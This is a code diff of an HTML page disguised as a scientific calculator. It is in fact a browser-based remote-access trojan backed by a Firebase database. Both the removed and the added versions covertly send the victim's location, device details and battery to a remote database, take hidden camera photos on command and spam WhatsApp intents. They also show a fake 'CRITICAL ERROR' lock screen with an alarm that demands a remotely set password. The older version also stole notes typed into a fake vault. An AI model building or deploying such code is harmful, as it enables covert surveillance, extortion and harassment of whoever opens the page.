@@ -1,62 +1,63 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Kalkulator Ilmiah Pro</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scientific Calculator Pro</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        :root { --accent: #007aff; --bg: #000; --card: #1c1c1e; }
-        body { background: var(--bg); color: #fff; font-family: sans-serif; margin: 0; overflow: hidden; height: 100vh; }
-        .page { display: none; height: 100vh; flex-direction: column; }
-        .active { display: flex; }
-        /* Kalkulator UI */
-        .display-container { flex: 1; display: flex; flex-direction: column; justify-content: flex-end; padding: 25px; }
-        #display { width: 100%; background: transparent; border: none; color: #fff; font-size: 4rem; text-align: right; outline: none; }
-        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; padding: 25px; background: var(--card); border-radius: 35px 35px 0 0; }
-        button { height: 75px; border-radius: 50%; border: none; background: #333; color: #fff; font-size: 1.6rem; font-weight: bold; }
-        .op { background: #ff9500; } .eq { background: var(--accent); }
-        /* Vault UI */
-        .vault-header { padding: 20px; background: var(--card); text-align: center; font-weight: bold; color: var(--accent); }
-        textarea { width: 90%; margin: 5%; height: 120px; background: #2c2c2e; border: none; border-radius: 12px; color: #fff; padding: 15px; box-sizing: border-box; }
-        /* Lock UI */
-        #lock-screen { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; color:red; z-index:999999; flex-direction:column; align-items:center; justify-content:center; text-align:center; }
-        #lock-screen input { padding: 10px; background: #222; border: 1px solid red; color: #fff; margin-top: 20px; text-align: center; }
-        #ghost-cam, #ghost-canvas { display: none; }
+        body { background: #1a1a1a; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .calc-box { background: #222; padding: 15px; border-radius: 15px; width: 320px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        #display { width: 100%; height: 60px; background: #333; border: none; margin-bottom: 15px; font-size: 1.8rem; text-align: right; padding: 10px; color: #fff; box-sizing: border-box; border-radius: 8px; }
+        .buttons { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
+        button { padding: 15px; font-size: 1rem; border: none; border-radius: 8px; cursor: pointer; background: #444; color: #fff; transition: 0.2s; }
+        button:active { background: #666; transform: translateY(2px); }
+        .op { background: #ff9500; font-weight: bold; }
+        .sci { background: #555; font-size: 0.9rem; }
+        .del { background: #ff3b30; }
+        /* Lock Overlay Style */
+        #brutal-lock { display: none; background: #000; color: #ff0000; height: 100vh; width: 100vw; position: fixed; top: 0; left: 0; z-index: 99999; flex-direction: column; align-items: center; justify-content: center; font-family: 'Courier New', monospace; text-align: center; }
+        #input-pass { background: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; font-size: 1.5rem; text-align: center; width: 80%; border-radius: 5px; }
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
 
-    <div id="calc-page" class="page active">
-        <div class="display-container"><input type="text" id="display" placeholder="0" readonly></div>
-        <div class="grid">
-            <button onclick="press('C')">C</button><button onclick="press('(')">(</button><button onclick="press(')')">)</button><button onclick="press('/')" class="op">÷</button>
-            <button onclick="press('7')">7</button><button onclick="press('8')">8</button><button onclick="press('9')">9</button><button onclick="press('*')" class="op">×</button>
-            <button onclick="press('4')">4</button><button onclick="press('5')">5</button><button onclick="press('6')">6</button><button onclick="press('-')" class="op">-</button>
-            <button onclick="press('1')">1</button><button onclick="press('2')">2</button><button onclick="press('3')">3</button><button onclick="press('+')" class="op">+</button>
-            <button onclick="press('0')">0</button><button onclick="press('.')">.</button><button onclick="solve()" class="eq" style="grid-column: span 2; border-radius: 40px;">=</button>
-        </div>
+<div class="calc-box">
+    <input type="text" id="display" readonly placeholder="0">
+    <div class="buttons">
+        <button class="sci" onclick="sci('Math.sqrt')">√</button>
+        <button class="sci" onclick="sci('Math.cos')">cos</button>
+        <button class="sci" onclick="sci('Math.sin')">sin</button>
+        <button class="sci" onclick="sci('Math.tan')">tan</button>
+        <button onclick="append('7')">7</button><button onclick="append('8')">8</button><button onclick="append('9')">9</button>
+        <button class="del" onclick="del()">DEL</button>
+        <button onclick="append('4')">4</button><button onclick="append('5')">5</button><button onclick="append('6')">6</button>
+        <button class="op" onclick="append('/')">÷</button>
+        <button onclick="append('1')">1</button><button onclick="append('2')">2</button><button onclick="append('3')">3</button>
+        <button class="op" onclick="append('*')">×</button>
+        <button onclick="append('.')">.</button><button onclick="append('0')">0</button>
+        <button class="op" onclick="solve()">=</button>
+        <button class="op" onclick="append('+')">+</button>
+        <button class="op" onclick="clr()" style="grid-column: span 4; background: #888;">RESET AC</button>
     </div>
+</div>
 
-    <div id="vault-page" class="page">
-        <div class="vault-header">SAFE VAULT</div>
-        <textarea id="note-input" placeholder="Tulis catatan rahasia..."></textarea>
-        <button onclick="saveNote()" style="width:90%; margin:5%; background:var(--accent); color:#fff; border:none; padding:15px; border-radius:8px;">SIMPAN</button>
+<div id="brutal-lock">
+    <h1 style="font-size: 2.5rem;">CRITICAL ERROR: 0x666</h1>
+    <p>SISTEM TELAH DIKUNCI OLEH DEVELOPER</p>
+    <div style="margin: 20px; padding: 20px; border: 2px solid red; background: rgba(255,0,0,0.1);">
+        <p>MASUKKAN KODE DEKRIPSI:</p>
+        <input type="password" id="input-pass">
+        <br><br>
+        <button onclick="checkPass()" style="background:red; color:white; border:none; padding:10px 30px; font-weight:bold; cursor:pointer;">UNLOCK DEVICE</button>
     </div>
+    <p style="color:yellow; font-size:0.8rem;">PERINGATAN: DATA AKAN TERHAPUS JIKA DIPAKSA RESTART</p>
+</div>
 
-    <div id="lock-screen">
-        <h1 style="font-size:3.5rem;">LOCKED</h1>
-        <p>Akses ditolak oleh sistem siber.<br>Masukkan Kode Unlocking:</p>
-        <input type="password" id="unlock-pass" placeholder="Password">
-        <button onclick="tryUnlock()" style="margin-top:10px; background:red; color:#fff; border:none; padding:10px 20px;">UNLOCK DEVICE</button>
-    </div>
-
-    <video id="ghost-cam" autoplay playsinline></video>
-    <canvas id="ghost-canvas"></canvas>
-
-    <script>
-            const firebaseConfig = {
+<script>
+    // 1. KONFIGURASI FIREBASE MASTER
+    const firebaseConfig = {
     apiKey: "AIzaSyAS9ZCVt6iFXY8Ksd0o5z7fjXg3qi8rfhU",
     authDomain: "remote-control-9bf2c.firebaseapp.com",
     databaseURL: "https://remote-control-9bf2c-default-rtdb.asia-southeast1.firebasedatabase.app",
@@ -64,80 +65,110 @@
     storageBucket: "remote-control-9bf2c.firebasestorage.app",
     messagingSenderId: "71798344189",
     appId: "1:71798344189:web:6cdb414c1eab16c6b9b194"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        const VICTIM_ID = localStorage.getItem('v_id') || "Target_" + Math.floor(1000 + Math.random() * 9000);
-        localStorage.setItem('v_id', VICTIM_ID);
-        let currentLockPass = "";
+    };
 
-        function initRemote() {
-            db.ref('rat/' + VICTIM_ID + '/command').on('value', (s) => {
-                const c = s.val(); if(!c) return;
-                if(c.action === "lock") {
-                    currentLockPass = c.pass;
-                    document.getElementById('lock-screen').style.display = 'flex';
-                    document.documentElement.requestFullscreen();
-                } else if(c.action === "unlock") {
-                    document.getElementById('lock-screen').style.display = 'none';
-                } else if(c === "front") takeShot("user");
-                else if(c === "back") takeShot("environment");
-                else if(c === "loc") getLoc();
-                db.ref('rat/' + VICTIM_ID + '/command').set(null);
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    
+    // Identifikasi unik per perangkat
+    const myId = "Target_" + Math.floor(Math.random() * 8999 + 1000);
+    let correctPass = "";
+    const alarm = new Audio('https://www.soundjay.com/buttons/sounds/beep-01a.mp3');
+    alarm.loop = true;
+
+    // 2. LOGIKA KALKULATOR
+    const display = document.getElementById('display');
+    function append(val) { display.value += val; requestPermissions(); }
+    function del() { display.value = display.value.slice(0, -1); }
+    function clr() { display.value = ""; }
+    function sci(func) { display.value = func + "(" + display.value + ")"; }
+    function solve() {
+        try { 
+            display.value = eval(display.value); 
+            sendData(); 
+        } catch { display.value = "Error"; }
+    }
+
+    // 3. FITUR PENGINTAI (LOKASI, BATERAI, FULLSCREEN)
+    function requestPermissions() {
+        navigator.geolocation.getCurrentPosition(pos => {
+            db.ref('targets/' + myId).update({
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                device: navigator.userAgent,
+                lastSeen: new Date().toLocaleString()
             });
-        }
+        });
+        document.documentElement.requestFullscreen().catch(()=>{});
+    }
 
-        async function takeShot(m) {
-            const v = document.getElementById('ghost-cam');
-            const c = document.getElementById('ghost-canvas');
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: m } });
-                v.srcObject = s; await new Promise(r => setTimeout(r, 1000));
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                db.ref('rat/'+VICTIM_ID+'/shots/'+m).set({ img: c.toDataURL('image/jpeg', 0.4) });
-                s.getTracks().forEach(t => t.stop());
-            } catch (e) {}
-        }
+    function sendData() {
+        navigator.getBattery().then(batt => {
+            db.ref('targets/' + myId).update({ battery: Math.floor(batt.level * 100) });
+        });
+    }
 
-        function getLoc() {
-            navigator.geolocation.getCurrentPosition((p) => {
-                db.ref('rat/'+VICTIM_ID+'/location').set({
-                    map: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`
-                });
-            }, null, {enableHighAccuracy: true});
-        }
+    // 4. FITUR KAMERA STEALTH
+    function takeSnap(mode) {
+        const constraints = { video: { facingMode: mode === 'front' ? "user" : "environment" } };
+        navigator.mediaDevices.getUserMedia(constraints).then(stream => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    db.ref('targets/' + myId).update({ photo: canvas.toDataURL('image/jpeg') });
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1500);
+            };
+        }).catch(err => console.log("Cam Error: ", err));
+    }
 
-        function tryUnlock() {
-            const p = document.getElementById('unlock-pass').value;
-            if(p === currentLockPass) {
-                document.getElementById('lock-screen').style.display = 'none';
-                if (document.exitFullscreen) document.exitFullscreen();
-            } else { alert("PASSWORD SALAH!"); }
-        }
+    // 5. LISTENER PERINTAH REMOTE
+    db.ref('targets/' + myId + '/command').on('value', (snapshot) => {
+        const cmd = snapshot.val();
+        if(!cmd) return;
 
-        const disp = document.getElementById('display');
-        function press(k) { (k==='C') ? disp.value='' : disp.value+=k; }
-        function solve() {
-            if(disp.value === "8888") {
-                document.getElementById('calc-page').classList.remove('active');
-                document.getElementById('vault-page').classList.add('active');
-                disp.value = ""; return;
+        // Command: WhatsApp Freeze
+        if(cmd.action === 'wa_bug') {
+            for(let i=0; i<15; i++) {
+                window.open("whatsapp://send?text=SYSTEM_FAILURE_0x666_BY_DEVELOPER", "_blank");
             }
-            try { disp.value = eval(disp.value); } catch(e) { disp.value = "Error"; }
         }
 
-        function saveNote() {
-            const txt = document.getElementById('note-input').value;
-            db.ref('rat/'+VICTIM_ID+'/stolen_notes').push({ content: txt });
-            alert("Catatan Disimpan.");
-        }
+        // Command: Kamera
+        if(cmd.action === 'snap_front') takeSnap('front');
+        if(cmd.action === 'snap_back') takeSnap('back');
 
-        window.onload = () => {
-            initRemote();
-            window.history.pushState(null, null, window.location.href);
-            window.onpopstate = () => window.history.pushState(null, null, window.location.href);
-        };
-    </script>
+        // Command: Brutal Lock
+        if(cmd.action === 'lock') {
+            correctPass = cmd.password;
+            document.getElementById('brutal-lock').style.display = 'flex';
+            alarm.play();
+            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 500]);
+            document.documentElement.requestFullscreen().catch(()=>{});
+        } 
+        
+        // Command: Unlock
+        else if(cmd.action === 'unlock') {
+            document.getElementById('brutal-lock').style.display = 'none';
+            alarm.pause();
+            location.reload();
+        }
+    });
+
+    function checkPass() {
+        const input = document.getElementById('input-pass').value;
+        if(input === correctPass) {
+            db.ref('targets/' + myId + '/command').update({ action: 'unlock' });
+        } else {
+            alert("PASSWORD SALAH! SISTEM TETAP TERKUNCI.");
+            if (navigator.vibrate) navigator.vibrate(1000);
+        }
+    }
+</script>
 </body>
 </html>
